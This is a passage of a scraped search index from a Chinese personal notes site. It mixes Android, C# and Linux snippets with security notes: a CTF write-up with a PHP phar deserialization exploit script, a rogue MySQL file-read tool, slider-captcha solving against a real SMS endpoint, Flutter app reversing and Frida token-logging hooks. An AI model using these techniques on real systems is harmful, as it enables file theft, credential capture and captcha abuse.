GridLayoutManager(requireContext(),2)\nval adapter = GenericAdapter(listOf(\u0026#34;Item 1\u0026#34;, \u0026#34;Item 2\u0026#34;), R.layout.item_layout) { view, item -\u0026gt; val textView: TextView = view.findViewById(R.id.textView) textView.text = item } recyclerView.adapter = adapter "},{"id":9,"href":"/docs/code/android/2024%E5%B9%B4-%E6%96%B0/%E7%BD%91%E7%BB%9C%E8%AF%B7%E6%B1%82/","title":"Android-网络请求","section":"Android","content":"依旧是网络请求大头,以最快的方式写\n协程 Retrofit\r#\rclass Auth(private val token: String) : Interceptor { override fun intercept(chain: Interceptor.Chain): Response { val request = chain.request() .newBuilder() .addHeader(\u0026#34;Authorization\u0026#34;,\u0026#34;Bearer $token\u0026#34;) .build() return chain.proceed( request) } } fun createRetrofitWithAuth() :Retrofit{ return Retrofit.Builder() .baseUrl(\u0026#34;http://124.93.196.45:10193/\u0026#34;) .addConverterFactory(GsonConverterFactory.create()) .build() } fun createRetrofitWithAuth(token:String) :Retrofit{ val client=OkHttpClient.Builder() .addInterceptor(Auth(token)) .build() return Retrofit.Builder() .baseUrl(\u0026#34;http://124.93.196.45:10193/\u0026#34;) .addConverterFactory(GsonConverterFactory.create()) .client(client) .build() } 定义接口\ninterface ApiService { @GET(\u0026#34;/prod-api/api/public-welfare/public-welfare-type/list\u0026#34;) suspend fun WelfareType(): WelfareType @POST(\u0026#34;/prod-api/api/login\u0026#34;) suspend fun Login(@Body body:LoginBody): Login @GET(\u0026#34;/prod-api/api/public-welfare/ad-banner/list\u0026#34;) suspend fun Banner(): Banner } viewmodel\nclass LoginViewModel: ViewModel() { private val _data = MutableLiveData\u0026lt;Login\u0026gt;() val data: LiveData\u0026lt;Login\u0026gt; = _data val loginApiService = createRetrofitWithAuth().create(ApiService::class.java) fun login(body:LoginBody){ viewModelScope.launch { _data.value=loginApiService.Login(body) } } } ui 中使用\nval login=findViewById\u0026lt;Button\u0026gt;(R.id.login) val username=findViewById\u0026lt;EditText\u0026gt;(R.id.username) val password=findViewById\u0026lt;EditText\u0026gt;(R.id.password) val viewmodel=LoginViewModel() login.setOnClickListener { if(username.text.toString() !=\u0026#34;\u0026#34;\u0026amp;\u0026amp; password.text.toString()!=\u0026#34;\u0026#34;){ viewmodel.login(LoginBody(username=username.text.toString(), password = password.text.toString())) viewmodel.data.observe(this){ Log.d(\u0026#34;Login\u0026#34;,it.toString()) if(it.code==200){ this.applicationContext.getSharedPreferences(\u0026#34;app\u0026#34;,Context.MODE_PRIVATE).edit { putString(\u0026#34;token\u0026#34;,it.token) } startActivity(Intent(this,MainActivity::class.java)) Toast.makeText(this, \u0026#34;登录成功\u0026#34;, Toast.LENGTH_SHORT).show() }else{ Toast.makeText(this, \u0026#34;登录失败\u0026#34;, Toast.LENGTH_SHORT).show() } } } } "},{"id":10,"href":"/docs/code/arch-linux/","title":"arch linux","section":"code","content":" 向日葵启动服务 sudo systemctl start runsunloginclient.service 解决VMWare - Could not connect ‘Ethernet0‘ to virtual network ‘/dev/vmnet0‘. sudo modprobe vmnet \u0026amp;\u0026amp; sudo vmware-networks --start sudo systemctl start vmware-networks.service mysql 启动 sudo systemctl start mysqld todesk启动服务 sudo systemctl start todeskd "},{"id":11,"href":"/docs/re/arm%E6%B1%87%E7%BC%96/","title":"arm 汇编","section":"re","content":"\rarm汇编\r#\r寄存器\n用户寄存器user，r0 -r12，r11一般指向堆栈的栈底，r13栈顶，r14（lr）函数返回地址，cpsr程序状态寄存器\n"},{"id":12,"href":"/docs/code/avaloniaui/","title":"avaloniaui","section":"code","content":"avaloniaui 打包windows 参考\ndotnet publish CountDown.sln -c Release -r win-x64 /p:PublishSingleFile=true /p:PublishTrimmed=true /p:PublishReadyToRun=true /p:PublishReadyToRunShowWarnings=true /p:UseAppHost=true /p:IncludeNativeLibrariesForSelfExtract=true /p:SelfContained=true --self-contained true "},{"id":13,"href":"/docs/wp/bili_22_1024/","title":"bili_22_1024","section":"e .wp","content":"今年比往年难,可见的,去年抄答案混分,说今年必然会做\n只做了三道题,菜\nezinvader\njs文件里头有个颜文字,解出来有个post,直接跑密码,提示了8个星号,8位弱密码\nAa123456,在响应头里,\n其实我自己没跑出来???\n问得别人密码,原来重置一下sessenid就行了\nup\n文件上传\n\u0026lt;?php // flag in /tmp/flag.php class Modifier { public function __invoke(){ include(\u0026#34;index.php\u0026#34;); } } class Action { public $checkAccess=\u0026#39;index.php\u0026#39;; public $id=\u0026#39;0a\u0026#39;; public function run() { if(strpos($this-\u0026gt;checkAccess, \u0026#39;upload\u0026#39;) !== false){ echo \u0026#34;error path\u0026#34;; exit(); } if ($this-\u0026gt;id !== 0 \u0026amp;\u0026amp; $this-\u0026gt;id !== 1) { switch($this-\u0026gt;id) { case 0: if ($this-\u0026gt;checkAccess) { include($this-\u0026gt;checkAccess); } break; case 1: throw new Exception(\u0026#34;id invalid in \u0026#34;.__CLASS__.__FUNCTION__); break; default: break; } } } } class Content { public $formatters; public function getFormatter($formatter)//close { echo $formatter,\u0026#39;-----\u0026#39;; if (isset($this-\u0026gt;formatters[$formatter])) { echo \u0026#39;222222222222\u0026#39;; return $this-\u0026gt;formatters[$formatter]; } foreach ($this-\u0026gt;providers as $provider) { if (method_exists($provider, $formatter)) { $this-\u0026gt;formatters[$formatter] = array($provider, $formatter); return $this-\u0026gt;formatters[$formatter]; } } throw new \\InvalidArgumentException(sprintf(\u0026#39;Unknown formatter \u0026#34;%s\u0026#34;\u0026#39;, $formatter)); } public function __call($name, $arguments) { $a=$this-\u0026gt;getFormatter($name); echo $a; return call_user_func_array($a, $arguments); } } class Show{ public $source; public $str; public $reader; public function __construct($file=\u0026#39;index.php\u0026#39;) { $this-\u0026gt;source = $file; echo \u0026#39;Welcome to \u0026#39;.$this-\u0026gt;source.\u0026#34;\u0026lt;br\u0026gt;\u0026#34;; } public function __toString() { echo \u0026#39;string--------\u0026#39;; $this-\u0026gt;str-\u0026gt;reset(); return \u0026#39;\u0026#39;; } public function __wakeup() { if(preg_match(\u0026#34;/gopher|phar|http|file|ftp|dict|\\.\\./i\u0026#34;, $this-\u0026gt;source)) { throw new Exception(\u0026#39;invalid protocol found in \u0026#39;.__CLASS__); echo \u0026#39;111111111111111111\u0026#39;; } } public function reset() { if ($this-\u0026gt;reader !== null) { echo \u0026#39;reset----\u0026#39;; $this-\u0026gt;reader-\u0026gt;close(); } } } $a=new Show(); $a-\u0026gt;str=\u0026#39;1\u0026#39;; $b=new Show; $b-\u0026gt;reader=\u0026#39;1\u0026#39;; $d=new Content; $d-\u0026gt;formatters[\u0026#39;close\u0026#39;]=array(new Action,\u0026#39;run\u0026#39;); $a-\u0026gt;reader=$d; $b-\u0026gt;str=$a; $c=new Show($b); $c-\u0026gt;str=\u0026#39;1\u0026#39;; $c-\u0026gt;reader=\u0026#39;1\u0026#39;; // $a=\u0026#39;O:4:\u0026#34;Show\u0026#34;:3:{s:6:\u0026#34;source\u0026#34;;O:4:\u0026#34;Show\u0026#34;:3:{s:6:\u0026#34;source\u0026#34;;s:9:\u0026#34;index.php\u0026#34;;s:3:\u0026#34;str\u0026#34;;O:4:\u0026#34;Show\u0026#34;:3:{s:6:\u0026#34;source\u0026#34;;s:9:\u0026#34;index.php\u0026#34;;s:3:\u0026#34;str\u0026#34;;s:1:\u0026#34;1\u0026#34;;s:6:\u0026#34;reader\u0026#34;;O:7:\u0026#34;Content\u0026#34;:1:{s:10:\u0026#34;formatters\u0026#34;;a:1:{s:5:\u0026#34;close\u0026#34;;a:2:{i:0;O:6:\u0026#34;Action\u0026#34;:2:{s:11:\u0026#34;checkAccess\u0026#34;;s:9:\u0026#34;index.php\u0026#34;;s:2:\u0026#34;id\u0026#34;;s:2:\u0026#34;0a\u0026#34;;}i:1;s:3:\u0026#34;run\u0026#34;;}}}}s:6:\u0026#34;reader\u0026#34;;s:1:\u0026#34;1\u0026#34;;}s:3:\u0026#34;str\u0026#34;;s:1:\u0026#34;1\u0026#34;;s:6:\u0026#34;reader\u0026#34;;s:1:\u0026#34;1\u0026#34;;}\u0026#39;; // unserialize($a) //show _construct _tostring reset content _call close ,$this-\u0026gt;formatters【\u0026#39;close\u0026#39;】 = 【new Action(), \u0026#39;run\u0026#39;】 $phar=new phar(\u0026#39;test.phar\u0026#39;); $phar-\u0026gt;startBuffering(); $phar-\u0026gt;setStub(\u0026#34;\u0026lt;?php __HALT_COMPILER();?\u0026gt;\u0026#34;); $phar-\u0026gt;setMetadata($c); $phar-\u0026gt;addFromString(\u0026#34;flag.txt\u0026#34;,\u0026#34;flag\u0026#34;); $phar-\u0026gt;stopBuffering(); ?\u0026gt; 改了后缀png,上传上去,触发\nc=phar://xxx.png 流量分析\n筛一下http,以前我没做过流量分析,看了提示,说是冰蝎流量,根据冰蝎流量的特征xor,解出flag\nezRe\n这是第六题\n菜死了,非预期解,完赛看得wp\nimport angr proj = angr.Project(\u0026#34;../../EzRe\u0026#34;) simgr = proj.factory.simgr() simgr.explore(find=lambda s: b\u0026#34;welcome\u0026#34; in s.posix.dumps(1)) print(simgr.found[0].posix.dumps(0)) "},{"id":14,"href":"/docs/code/c%23/","title":"c#","section":"code","content":"\rC#开发笔记\r#\r网络请求\r#\rusing System.Collections.Generic; using System.Diagnostics; using System.Text.Json.Nodes; string cookie = \u0026#34;\u0026#34;; var handler = new HttpClientHandler(); using (var httpClient = new HttpClient(handler)) { using (var request = new HttpRequestMessage(new HttpMethod(\u0026#34;POST\u0026#34;), new Uri(\u0026#34;https://cloud.yibailingshou.com/wsy_user/web/index.php?m=login\u0026amp;a=register_get_phone_code\u0026#34;))) { var multipartContent = new MultipartFormDataContent(); multipartContent.Add(new StringContent(\u0026#34;17628818007\u0026#34;), \u0026#34;phone\u0026#34;); multipartContent.Add(new StringContent(\u0026#34;czo0OiI5NTY1Ijs\u0026#34;), \u0026#34;customer_id\u0026#34;); multipartContent.Add(new StringContent(\u0026#34;+86\u0026#34;), \u0026#34;country_code\u0026#34;); multipartContent.Add(new StringContent(\u0026#34;\u0026#34;), \u0026#34;captcha_token\u0026#34;);//post data request.Headers.TryAddWithoutValidation(\u0026#34;X-Requested-With\u0026#34;, \u0026#34;XMLHttpRequest\u0026#34;);//添加header request.Content = multipartContent; using (var response = await httpClient.SendAsync(request)) { response.EnsureSuccessStatusCode(); var body = await response.Content.ReadAsStringAsync(); Console.WriteLine(body);// 响应正文 Console.WriteLine(response); if (response.Headers.TryGetValues(\u0026#34;Set-Cookie\u0026#34;, out IEnumerable\u0026lt;string\u0026gt; cookieValues)) { string ck = cookieValues.FirstOrDefault();//响应header中的Set-cookie Console.WriteLine(ck.Split(\u0026#34;;\u0026#34;)[0]); } dynamic result = JsonNode.Parse(body)!;//json解析 if (result[\u0026#34;errcode\u0026#34;].GetValue\u0026lt;int\u0026gt;() == 407)// json对象取值 { //return \u0026#34;407\u0026#34;; } else if (result[\u0026#34;errcode\u0026#34;].GetValue\u0026lt;int\u0026gt;() == 0) { //return \u0026#34;0\u0026#34;; } else { //return \u0026#34;false\u0026#34;; } } } } AES加密\r#\r解密反之，易写\nstring Aesen(string text, string secret) { // Input plaintext string plainText = \u0026#34;This is a secret message.\u0026#34;; // Generate key byte[] key = Encoding.ASCII.GetBytes(secret); // Encrypt using (AesCryptoServiceProvider aes = new AesCryptoServiceProvider()) { aes.KeySize = 128;//相应的填充16=\u0026gt;128 32=\u0026gt;256 aes.BlockSize = 128; aes.Key = key; aes.Padding = PaddingMode.PKCS7; aes.Mode = CipherMode.ECB; ICryptoTransform encryptor = aes.CreateEncryptor(aes.Key, null); byte[] plainBytes = Encoding.UTF8.GetBytes(text); byte[] encryptedBytes = encryptor.TransformFinalBlock(plainBytes, 0, plainBytes.Length); // Output ciphertext string cipherText = Convert.ToBase64String(encryptedBytes); Console.WriteLine(\u0026#34;Ciphertext: \u0026#34; + cipherText); return cipherText; } } 网络图片的保存\r#\rasync Task SImg(string url, string filePath) { using (var client = new HttpClient()) { using (var response = await client.GetAsync(url)) { using (var stream = await response.Content.ReadAsStreamAsync()) { using (var fileStream = new FileStream(filePath, FileMode.Create, FileAccess.Write)) { await stream.CopyToAsync(fileStream); } } } } Console.WriteLine(\u0026#34;Image downloaded.\u0026#34;); } 缺口坐标识别（待优化\r#\r因为有些图中包含多个缺口，所有准确率有待优化\nint GetImgX(string bg_path, string tg_path) { Mat bg = Cv2.ImRead(bg_path); Mat tg = Cv2.ImRead(tg_path); Mat bg_gray = new Mat(); Mat tg_gray = new Mat(); Cv2.CvtColor(bg, bg_gray, ColorConversionCodes.BGR2GRAY); Cv2.CvtColor(tg, tg_gray, ColorConversionCodes.BGR2GRAY); int h = tg.Rows; int w = tg.Cols; Mat res = new Mat(); Cv2.MatchTemplate(bg_gray, tg_gray, res, TemplateMatchModes.CCoeffNormed); double min_val, max_val; Point min_loc, max_loc; Cv2.MinMaxLoc(res, out min_val, out max_val, out min_loc, out max_loc); Console.WriteLine(max_loc); return (int)max_loc.X; } "},{"id":15,"href":"/docs/network-security/tools/fake-mysql/","title":"fake-mysql","section":"tools","content":"\rfake mysql\r#\r大佬的github\npython3似乎也可运行\npython2/3 roguemysqlserver.py 不要开启mysql ，关掉，filelist里头是你要读取的文件，外部连接时，会出现类似与报错的输出，这时候看mysql.log\n已经有读取内容了\n别人连接你的mysql，也需要加 -u -p,除非无密码\n吃饭去了\n"},{"id":16,"href":"/docs/re/flutter---blutter/","title":"flutter - blutter","section":"re","content":"\r0x1\r#\r手把手带你逆向flutter。\n如今flutter的逆向光靠使用reflutter已经有些不行了，在逛github的时候发现了一个项目 worawit/blutter：Flutter移动应用程序逆向工程工具\n根据作者的步骤来。\nwin，先把Visual Studio 2022 给安装上，配置好C/C++的开发环境。\n期间因为需要访问github，所以最好使挂上代理，注意将port替换为你代理的端口\nset HTTP_PROXY=http://127.0.0.1:port set HTTPS_PROXY=http://127.0.0.1:port 克隆下来\ngit clone https://github.com/worawit/blutter.git cd blutter 安装所需的库文件\npython scripts\\init_env_win.py 然后把flutter软件里的lib文件夹提出来，如arm64-v8a文件夹，注意两个文件都需要（libapp.so、libflutter.so）\n在win的所有应用里面找到Visual Studio 2022 里面的 x64 Native Tools Command Prompt for VS 2022\n在里面输入，注意在此终端仍建议挂上代理（需下载很多），一定注意代理\npython blutter.py ./app/lib/arm64-v8a ./output 会有相当多的需要编译，cpu都给干烧了\nC:\\Users\\jinchuan\\Desktop\\2\\blutter\u0026gt;python blutter.py ./demo ./output Dart version: 2.19.3, Snapshot: adb4292f3ec25074ca70abcd2d5c7251, Target: android arm64 Cloning into \u0026#39;C:\\Users\\jinchuan\\Desktop\\2\\blutter\\dartsdk\\v2.19.3\u0026#39;... remote: Enumerating objects: 2361, done. remote: Counting objects: 100% (2361/2361), done. remote: Compressing objects: 100% (1912/1912), done. remote: Total 2361 (delta 82), reused 1427 (delta 63), pack-reused 0 Receiving objects: 100% (2361/2361), 1.34 MiB | 197.00 KiB/s, done. Resolving deltas: 100% (82/82), done. remote: Enumerating objects: 23, done. remote: Counting objects: 100% (23/23), done. remote: Compressing objects: 100% (22/22), done. remote: Total 23 (delta 0), reused 7 (delta 0), pack-reused 0 Receiving objects: 100% (23/23), 119.77 KiB | 257.00 KiB/s, done. Updating files: 100% (23/23), done. remote: Enumerating objects: 3424, done. remote: Counting objects: 100% (3424/3424), done. remote: Compressing objects: 100% (2343/2343), done. remote: Total 3424 (delta 1159), reused 2165 (delta 1048), pack-reused 0 Receiving objects: 100% (3424/3424), 8.90 MiB | 4.09 MiB/s, done. Resolving deltas: 100% (1159/1159), done. Updating files: 100% (3886/3886), done. -- Configuring done (4.8s) -- Generating done (0.1s) -- Build files have been written to: C:/Users/jinchuan/Desktop/2/blutter/build/dartvm2.19.3_android_arm64 [124/268] Building CXX object CMakeFiles\\dartvm2.19.3_android_arm64.dir\\runtime\\vm\\profiler_service.cc.obj C:\\Users\\jinchuan\\Desktop\\2\\blutter\\dartsdk\\v2.19.3\\runtime\\vm/scope_timer.h(38): warning C4566: 由通用字符名称“\\u00B5”表示的字符不能在当前代码页(936)中表示出来 [133/268] Building CXX object CMakeFiles\\dartvm2.19.3_android_arm64.dir\\runtime\\vm\\regexp_assembler.cc.obj C:\\Users\\jinchuan\\Desktop\\2\\blutter\\external\\icu-windows\\include\\unicode/stringoptions.h(1): warning C4819: 该文件包含不能在当前代码页(936)中表示的字符。请将该文件保存为 Unicode 格式以防止数据丢失 C:\\Users\\jinchuan\\Desktop\\2\\blutter\\external\\icu-windows\\include\\unicode/uchar.h(3156): warning C4819: 该文件包含不能在当前代码页(936)中表示的字符。请将该文件保存为 Unicode 格式以防止数据丢失 //省略n多 C:\\Users\\jinchuan\\Desktop\\2\\blutter\\dartsdk\\v2.19.3\\runtime\\vm/timer.h(156): warning C4566: 由通用字符名称“\\u00B5”表示的字符不能在当前代码页(936)中表示出来 [268/268] Linking CXX static library dartvm2.19.3_android_arm64.lib -- Install configuration: \u0026#34;Release\u0026#34; -- Installing: C:/Users/jinchuan/Desktop/2/blutter/dartsdk/v2.19.3/../../packages/lib/dartvm2.19.3_android_arm64.lib -- Installing: C:/Users/jinchuan/Desktop/2/blutter/dartsdk/v2.19.3/../../packages/include/dartvm2.19.3 -- Installing: C:/Users/jinchuan/Desktop/2/blutter/dartsdk/v2.19.3/../../packages/include/dartvm2.19.3/include -- Installing: C:/Users/jinchuan/Desktop/2/blutter/dartsdk/v2.19.3/../../packages/include/dartvm2.19.3/include/analyze_snapshot_api.h //省略n多 -- Installing: C:/Users/jinchuan/Desktop/2/blutter/dartsdk/v2.19.3/../../packages/include/dartvm2.19.3/platform/utils_win.h -- Installing: C:/Users/jinchuan/Desktop/2/blutter/dartsdk/v2.19.3/../../packages/include/dartvm2.19.3/vm -- Installing: C:/Users/jinchuan/Desktop/2/blutter/dartsdk/v2.19.3/../../packages/include/dartvm2.19.3/vm/allocation.h -- Installing: C:/Users/jinchuan/Desktop/2/blutter/dartsdk/v2.19.3/../../packages/include/dartvm2.19.3/vm/app_snapshot.h -- Installing: C:/Users/jinchuan/Desktop/2/blutter/dartsdk/v2.19.3/../../packages/include/dartvm2.19.3/vm/base64.h -- Installing: C:/Users/jinchuan/Desktop/2/blutter/dartsdk/v2.19.3/../../packages/include/dartvm2.19.3/vm/base_isolate.h -- Installing: C:/Users/jinchuan/Desktop/2/blutter/dartsdk/v2.19.3/../../packages/include/dartvm2.19.3/vm/zone_text_buffer.h -- Installing: C:/Users/jinchuan/Desktop/2/blutter/dartsdk/v2.19.3/../../packages/lib/cmake/dartvm2.19.3_android_arm64/dartvmTarget.cmake -- Installing: C:/Users/jinchuan/Desktop/2/blutter/dartsdk/v2.19.3/../../packages/lib/cmake/dartvm2.19.3_android_arm64/dartvmTarget-release.cmake -- Installing: C:/Users/jinchuan/Desktop/2/blutter/dartsdk/v2.19.3/../../packages/lib/cmake/dartvm2.19.3_android_arm64/dartvm2.19.3_android_arm64Config.cmake -- Installing: C:/Users/jinchuan/Desktop/2/blutter/dartsdk/v2.19.3/../../packages/lib/cmake/dartvm2.19.3_android_arm64/dartvm2.19.3_android_arm64ConfigVersion.cmake -- Configuring done (1.6s) -- Generating done (0.0s) -- Build files have been written to: C:/Users/jinchuan/Desktop/2/blutter/build/blutter_dartvm2.19.3_android_arm64 [22/22] Linking CXX executable blutter_dartvm2.19.3_android_arm64.exe -- Install configuration: \u0026#34;Release\u0026#34; 以上为编译成功\n以上为解析\n注意此项目仅适用与较新的flutter版本，3.0以上应该没问题，2.0可能会报错，此致可以尝试使用项目的分支GitHub - uni7corn/blutter: Flutter Mobile Application Reverse Engineering Tool\n当前作者更新速度极快，三天两头就有更新\n0x2\r#\r我之前写的一个flutter，手法非常浅显\n试了一下我的app，利用工具解出来的文件有\nouput ├─ asm//很多 ├─ blutter_frida.js ├─ ida_script │ ├─ addNames.py │ └─ ida_dart_struct.h ├─ objs.txt └─ pp.txt 如果是aes的话，基本可以直接看到key，md5不是很容易看出来，ida也可以也可以批量重命名\n当然不排除我的app太弱了，连我自己都觉得\n0x3\r#\r在我实验成功后，马上上google找了几个色播来试试水，(糖心)，一顿操作，发现lib里面只有32位的，这个项目现在名不能解析32为的flutter，原来色播永远领先我一步\n"},{"id":17,"href":"/docs/re/flutter/","title":"flutter 初探","section":"re","content":"\r安装\r#\r首先我们手搓一个flutter apk来\n去官网下载flutter 解压，配置环境bin目录\n考虑网络因素，配置国内源，环境变量清华源\nexport PUB_HOSTED_URL=https://mirrors.tuna.tsinghua.edu.cn/dart-pub export FLUTTER_STORAGE_BASE_URL=https://mirrors.tuna.tsinghua.edu.cn/flutter 配置\r#\r使用vscode，插件安装flutter，配置flutter sdk的路径\n安装dart插件。\nctrl+shift+P 输入flutter 选择 new project，选择application，会生成项目\n在里面随便加点加密\n在文件pubspec.yaml文件中 dependencies节点下添加依赖\ncrypto: ^3.0.3 随后在项目的根目录下执行\nflutter packages get main.dart文件\nimport \u0026#39;package:crypto/crypto.dart\u0026#39;; import \u0026#39;dart:convert\u0026#39;; md5加密\nmd5.convert(utf8.encode(\u0026#34;hello\u0026#34;)).toString() 先测试一下是否正常安装，随后打包release版本\n打包\nflutter build apk 反编译\r#\r使用reflutter来获取dart文件，其中包含了……，使用详见\n记得将apk重新签名一遍\n打开，在app 数据目录，找到dump.dart文件\n当你满脸欢喜的打开，搜索md5，诶，我函数呢，妈的。\n"},{"id":18,"href":"/docs/re/frida/","title":"frida","section":"re","content":"查看进程\nfrida-ps -U frida-ps -R 注入js,注意这里是软件名,填包名的话会出现process not found\nfrida -U -1 1.js 软件名 frida -U -l 1.js -f 软件名 --no-pause 正常附加\nfrida -U -l 1.js 软件名 swap附加\nfrida -U -l 1.js -f 软件名 报错\n\u0026#34;Error: invalid address setenforce 0 ps |grep keyword # 查看进程 su kill -9 pid 用一楼工具那个启动为什么会软重启（我也不到这是不是软重启，因为出现了开机动画，但是adb没掉），之后再附加会提示 unable to find process with name \u0026#39;system_server\u0026#39;，设备真机root 端口转发\nadb forward tcp:27043 tcp:27043 l8N2iooyp07M9IWa 动态加载dex\nJava.perform(function () { console.log(\u0026#39;dddd\u0026#39;) // frida有个类加载器，遍历 Java.enumerateClassLoaders({ onMatch: function (loader) { // 每次匹配到，都要把匹配到的赋值给java默认的loader Java.classFactory.loader = loader; var TestClass; // 没报错就hook到了，报错了就hook下一个，如果全都报错了，没打印东西，那可能就是hook错了。 try { let a = Java.use(\u0026#34;okhttp3.b0$a\u0026#34;); a[\u0026#39;a\u0026#39;].overload(\u0026#39;java.lang.String\u0026#39;, \u0026#39;java.lang.String\u0026#39;).implementation = function (str, str2) { if(str==\u0026#39;X-TOKEN\u0026#39;) console.log(\u0026#39;b is called\u0026#39; + \u0026#39;, \u0026#39; + \u0026#39;str: \u0026#39; + str + \u0026#39;, \u0026#39; + \u0026#39;str2: \u0026#39; + str2+\u0026#39;this X-TOKEN-----------------\u0026#39;); let ret = this.b(str, str2); console.log(\u0026#39;b ret value is \u0026#39; + ret); return ret; } }catch(error) { if (error.message.includes(\u0026#34;ClassNotFoundException\u0026#34;)) { console.log(\u0026#34; You are trying to load encrypted class, trying next loader\u0026#34;); } else { console.log(error.message); } } }, onComplete: function () { } }) }) 动态dex，来自看雪论坛\n//调用方法 function printStack() { Java.perform(function () { var Exception = Java.use(\u0026#34;java.lang.Exception\u0026#34;); var ins = Exception.$new(\u0026#34;Exception\u0026#34;); var straces = ins.getStackTrace(); if (straces != undefined \u0026amp;\u0026amp; straces != null) { var strace = straces.toString(); var replaceStr = strace.replace(/,/g, \u0026#34;\\r\\n\u0026#34;); console.log(\u0026#34;=============================Stack strat=======================\u0026#34;); console.log(replaceStr); console.log(\u0026#34;=============================Stack end=======================\\r\\n\u0026#34;); Exception.$dispose(); } }); } function hook1(clz){ clz[\u0026#34;onCreate\u0026#34;].implementation = function (bundle) { console.log(\u0026#39;onCreate is called\u0026#39; + \u0026#39;, \u0026#39; + \u0026#39;bundle: \u0026#39; + bundle); let ret = this.onCreate(bundle); printStack(); return ret;}; } Java.perform(function(){ Java.choose(\u0026#34;dalvik.system.PathClassLoader\u0026#34;,{ onMatch: function(instance){ console.log(instance) console.log(Java.ClassFactory) var factory = Java.ClassFactory.get(instance) try{ var myClass = factory.use(\u0026#34;com.devsense.activities.MainInputKeypadActivity\u0026#34;) hook1(myClass) return \u0026#34;stop\u0026#34; }catch(e){ console.log(\u0026#34;next\u0026#34;) console.log(e) } }, onComplete:function(){ console.log(\u0026#34;Done\u0026#34;) } }) }) Crypto\nvar N_ENCRYPT_MODE = 1 var N_DECRYPT_MODE = 2 function showStacks() { var Exception = Java.use(\u0026#34;java.lang.Exception\u0026#34;); var ins = Exception.$new(\u0026#34;Exception\u0026#34;); var straces = ins.getStackTrace(); if (undefined == straces || null == straces) { return; } console.log(\u0026#34;============================= Stack strat=======================\u0026#34;); console.log(\u0026#34;\u0026#34;); for (var i = 0; i \u0026lt; straces.length; i++) { var str = \u0026#34; \u0026#34; + straces[i].toString(); console.log(str); } console.log(\u0026#34;\u0026#34;); console.log(\u0026#34;============================= Stack end=======================\\r\\n\u0026#34;); Exception.$dispose(); } //工具相关函数 var base64EncodeChars = \u0026#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\u0026#39;, base64DecodeChars = new Array((-1), (-1), (-1), (-1), (-1), (-1), (-1), (-1), (-1), (-1), (-1), (-1), (-1), (-1), (-1), (-1), (-1), (-1), (-1), (-1), (-1), (-1), (-1), (-1), (-1), (-1), (-1), (-1), (-1), (-1), (-1), (-1), (-1), (-1), (-1), (-1), (-1), (-1), (-1), (-1), (-1), (-1), (-1), 62, (-1), (-1), (-1), 63, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, (-1), (-1), (-1), (-1), (-1), (-1), (-1), 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, (-1), (-1), (-1), (-1), (-1), (-1), 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, (-1), (-1), (-1), (-1), (-1)); function stringToBase64(e) { var r, a, c, h, o, t; for (c = e.length, a = 0, r = \u0026#39;\u0026#39;; a \u0026lt; c;) { if (h = 255 \u0026amp; e.charCodeAt(a++), a == c) { r += base64EncodeChars.charAt(h \u0026gt;\u0026gt; 2), r += base64EncodeChars.charAt((3 \u0026amp; h) \u0026lt;\u0026lt; 4), r += \u0026#39;==\u0026#39;; break } if (o = e.charCodeAt(a++), a == c) { r += base64EncodeChars.charAt(h \u0026gt;\u0026gt; 2), r += base64EncodeChars.charAt((3 \u0026amp; h) \u0026lt;\u0026lt; 4 | (240 \u0026amp; o) \u0026gt;\u0026gt; 4), r += base64EncodeChars.charAt((15 \u0026amp; o) \u0026lt;\u0026lt; 2), r += \u0026#39;=\u0026#39;; break } t = e.charCodeAt(a++), r += base64EncodeChars.charAt(h \u0026gt;\u0026gt; 2), r += base64EncodeChars.charAt((3 \u0026amp; h) \u0026lt;\u0026lt; 4 | (240 \u0026amp; o) \u0026gt;\u0026gt; 4), r += base64EncodeChars.charAt((15 \u0026amp; o) \u0026lt;\u0026lt; 2 | (192 \u0026amp; t) \u0026gt;\u0026gt; 6), r += base64EncodeChars.charAt(63 \u0026amp; t) } return r } function base64ToString(e) { var r, a, c, h, o, t, d; for (t = e.length, o = 0, d = \u0026#39;\u0026#39;; o \u0026lt; t;) { do r = base64DecodeChars[255 \u0026amp; e.charCodeAt(o++)]; while (o \u0026lt; t \u0026amp;\u0026amp; r == -1); if (r == -1) break; do a = base64DecodeChars[255 \u0026amp; e.charCodeAt(o++)]; while (o \u0026lt; t \u0026amp;\u0026amp; a == -1); if (a == -1) break; d += String.fromCharCode(r \u0026lt;\u0026lt; 2 | (48 \u0026amp; a) \u0026gt;\u0026gt; 4); do { if (c = 255 \u0026amp; e.charCodeAt(o++), 61 == c) return d; c = base64DecodeChars[c] } while (o \u0026lt; t \u0026amp;\u0026amp; c == -1); if (c == -1) break; d += String.fromCharCode((15 \u0026amp; a) \u0026lt;\u0026lt; 4 | (60 \u0026amp; c) \u0026gt;\u0026gt; 2); do { if (h = 255 \u0026amp; e.charCodeAt(o++), 61 == h) return d; h = base64DecodeChars[h] } while (o \u0026lt; t \u0026amp;\u0026amp; h == -1); if (h == -1) break; d += String.fromCharCode((3 \u0026amp; c) \u0026lt;\u0026lt; 6 | h) } return d } function hexToBase64(str) { return base64Encode(String.fromCharCode.apply(null, str.replace(/\\r|\\n/g, \u0026#34;\u0026#34;).replace(/([\\da-fA-F]{2}) ?/g, \u0026#34;0x$1 \u0026#34;).replace(/ +$/, \u0026#34;\u0026#34;).split(\u0026#34; \u0026#34;))); } function base64ToHex(str) { for (var i = 0, bin = base64Decode(str.replace(/[ \\r\\n]+$/, \u0026#34;\u0026#34;)), hex = []; i \u0026lt; bin.length; ++i) { var tmp = bin.charCodeAt(i).toString(16); if (tmp.length === 1) tmp = \u0026#34;0\u0026#34; + tmp; hex[hex.length] = tmp; } return hex.join(\u0026#34;\u0026#34;); } function hexToBytes(str) { var pos = 0; var len = str.length; if (len % 2 != 0) { return null; } len /= 2; var hexA = new Array(); for (var i = 0; i \u0026lt; len; i++) { var s = str.substr(pos, 2); var v = parseInt(s, 16); hexA.push(v); pos += 2; } return hexA; } function bytesToHex(arr) { var str = \u0026#39;\u0026#39;; var k, j; for (var i = 0; i \u0026lt; arr.length; i++) { k = arr[i]; j = k; if (k \u0026lt; 0) { j = k + 256; } if (j \u0026lt; 16) { str += \u0026#34;0\u0026#34;; } str += j.toString(16); } return str; } function 